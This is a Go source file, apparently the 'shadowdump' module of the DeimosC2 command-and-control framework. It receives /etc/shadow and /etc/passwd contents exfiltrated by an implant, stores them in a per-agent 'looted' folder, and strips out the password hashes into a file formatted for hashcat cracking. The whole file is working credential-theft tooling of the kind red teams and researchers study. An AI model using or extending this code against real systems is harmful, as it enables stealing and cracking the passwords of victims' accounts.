package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/rpc"
	"net/rpc/jsonrpc"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"sync"

	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/logging"
	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/modulescommon"
)

//ModData is used for RPC
type ModData int

var wg sync.WaitGroup

var rpcPort = 63002
var client *rpc.Client

type downloadOutput struct {
	ShadowData string
	PassData   string
}

//Module is the datastructure of modules
type Module struct {
	Name string //Holds the name of the module
	Port int    //Holds the RPC port of the module server
}

func startModuleServer() {
	logging.Logger.Println("Modules RPC server starting up")
	modRPC := new(ModData)
	rpc.Register(modRPC)
	rpc.HandleHTTP()
	var l net.Listener
	var e error
	for {
		s := strconv.Itoa(rpcPort)
		l, e = net.Listen("tcp", "127.0.0.1:"+s)
		if e == nil {
			break
		}
		rpcPort++
	}
	wg.Add(1)
	//go http.Serve(l, nil)
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}

		go rpc.ServeCodec(jsonrpc.NewServerCodec(conn))
	}

}

//RecData will take in data to be acted on from the server
func (t *ModData) RecData(data modulescommon.ModuleCom, reply *string) error {
	logging.Logger.Println("RecData called!")
	r := server(data)
	logging.Logger.Println(r)
	*reply = r
	return nil
}

//EndServer will be called in order to end the module
func (t *ModData) EndServer(end bool, reply *bool) error {
	logging.Logger.Println("EndServer called!")
	if end == true {
		defer wg.Done()
	}
	return nil
}

func server(data modulescommon.ModuleCom) string {
	cwd, _ := os.Getwd()

	//Assign dmpFile content to the content of the struct downloadOutput
	var dmpContent downloadOutput
	json.Unmarshal(data.Data, &dmpContent)

	//Shadow file
	shadowData, _ := base64.StdEncoding.DecodeString(dmpContent.ShadowData)
	shadowPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", "shadow.txt")
	shadowName := fmt.Sprintf(shadowPath)
	shadowfile, _ := os.Create(shadowName)
	shadowfile.Write(shadowData)

	//Shadow file
	passData, _ := base64.StdEncoding.DecodeString(dmpContent.PassData)
	passPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", "passwd.txt")
	passName := fmt.Sprintf(passPath)
	passfile, _ := os.Create(passName)
	passfile.Write(passData)

	var reply int
	shadowMsg := modulescommon.ModOutput{
		AgentKey:   data.AgentKey,
		ModuleName: data.ModuleName,
		OutputType: "Link",
		Output:     []byte(filepath.Base(shadowPath)),
	}

	client.Call("ModData.ModSendData", &shadowMsg, &reply)

	passMsg := modulescommon.ModOutput{
		AgentKey:   data.AgentKey,
		ModuleName: data.ModuleName,
		OutputType: "Link",
		Output:     []byte(filepath.Base(passPath)),
	}

	client.Call("ModData.ModSendData", &passMsg, &reply)

	//Hashcat ready file of /etc/shadow passwords to be cracked
	hashFile, _ := os.Open(shadowPath)

	scanner := bufio.NewScanner(hashFile)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	hashcatPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", "hashcat_shadow.txt")
	hashcatName := fmt.Sprintf(hashcatPath)
	hashcatfile, _ := os.Create(hashcatName)

	for _, eachline := range txtlines {
		formatChange := strings.Split(eachline, ":")
		if formatChange[1] != "*" && formatChange[1] != "!" {
			hashcatfile.WriteString(formatChange[1] + "\n")
		}

	}

	hashMsg := modulescommon.ModOutput{
		AgentKey:   data.AgentKey,
		ModuleName: data.ModuleName,
		OutputType: "Link",
		Output:     []byte(filepath.Base(hashcatPath)),
	}

	client.Call("ModData.ModSendData", &hashMsg, &reply)

	return ""
}

func main() {
	port := os.Args[1]
	//Starts up the local RPC server to recieve data
	go startModuleServer()
	logging.Logger.Println("connecting")
	//Makes the connection to the main server
	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("dialing:", err)
	}

	defer conn.Close()

	client = jsonrpc.NewClient(conn)

	m := Module{"shadowdump", rpcPort}

	logging.Logger.Println("Checking in..")
	var reply []byte
	//Registers with the main server
	err = client.Call("ModData.ModInit", m, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

	//Waits till the module is finished
	wg.Wait()
}
